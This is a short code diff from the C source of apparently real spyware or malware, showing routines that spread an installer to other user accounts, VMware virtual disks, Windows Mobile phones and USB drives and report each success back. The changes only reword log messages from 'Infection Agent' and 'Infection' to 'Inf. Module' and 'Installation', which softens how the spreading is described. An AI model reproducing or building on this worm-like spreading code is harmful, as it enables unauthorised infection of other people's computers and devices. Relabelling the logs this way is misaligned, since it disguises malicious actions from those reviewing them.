@@ -579,7 +579,7 @@ void InfectUsers()
 		if (SpreadToUser(tmp_ptr, user_home, user_sid)) {
 			if ( user_name = wcsrchr(user_home, L'\\') ) {
 				user_name++;
-				_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"[Infection Agent]: Spread to %s", user_name);
+				_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"[Inf. Module]: Spread to %s", user_name);
 				SendStatusLog(tmp_buf);	
 			}
 			one_user_infected = TRUE;
@@ -950,8 +950,8 @@ void InfectVMWare(char *disk_path)
 		return;
 
 	if (InfectVMDisk(drive_letter, EXE_INSTALLER_NAME)) {
-		REPORT_STATUS_LOG("- VMWare Infection..............OK\r\n");
-		_snwprintf_s(msg, sizeof(msg)/sizeof(WCHAR), _TRUNCATE, L"[Infection Agent]: Spread to VMWare %S", disk_path);		
+		REPORT_STATUS_LOG("- VMWare Installation...........OK\r\n");
+		_snwprintf_s(msg, sizeof(msg)/sizeof(WCHAR), _TRUNCATE, L"[Inf. Module]: Spread to VMWare %S", disk_path);		
 		SendStatusLog(msg);	
 	}
 
@@ -1121,8 +1121,8 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 		if (infection_pda && PDAFilesPresent() && TryRapiConnect(3000)) {
 			if (FindMemoryCard(mmc_path, MAX_PATH) && !IsPDAInfected(mmc_path)) {
 				if (InfectPDA(mmc_path)) {
-					REPORT_STATUS_LOG("- WM SmartPhone Infection.......OK\r\n");
-					SendStatusLog(L"[Infection Agent]: Spread to Mobile Device");	
+					REPORT_STATUS_LOG("- WM SmartPhone Installation....OK\r\n");
+					SendStatusLog(L"[Inf. Module]: Spread to Mobile Device");	
 				}
 			}
 			RapiDisconnect();
@@ -1136,8 +1136,8 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 	LOOP {
 		if (first_time && TryRapiConnect(3000)) {
 			first_time = FALSE;
-			REPORT_STATUS_LOG("- WM SmartPhone Infection.......OK\r\n");
-			SendStatusLog(L"[Infection Agent]: Spread to Mobile Device");	
+			REPORT_STATUS_LOG("- WM SmartPhone Installation....OK\r\n");
+			SendStatusLog(L"[Inf. Module]: Spread to Mobile Device");	
 			RapiDisconnect();
 		}
 		CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME/2);
@@ -1161,8 +1161,8 @@ DWORD WINAPI MonitorUSBThread(DWORD dummy)
 				type = FNC(GetDriveTypeW)(drive_letter);
 
 				if (type==DRIVE_REMOVABLE && !IsUSBInfected(drive_letter) && InfectUSB(drive_letter, EXE_INSTALLER_NAME)) {
-					REPORT_STATUS_LOG("- USB Drive Infection...........OK\r\n");
-					SendStatusLog(L"[Infection Agent]: Spread to USB Drive");	
+					REPORT_STATUS_LOG("- USB Drive Installation........OK\r\n");
+					SendStatusLog(L"[Inf. Module]: Spread to USB Drive");	
 				}
 			}
 		}
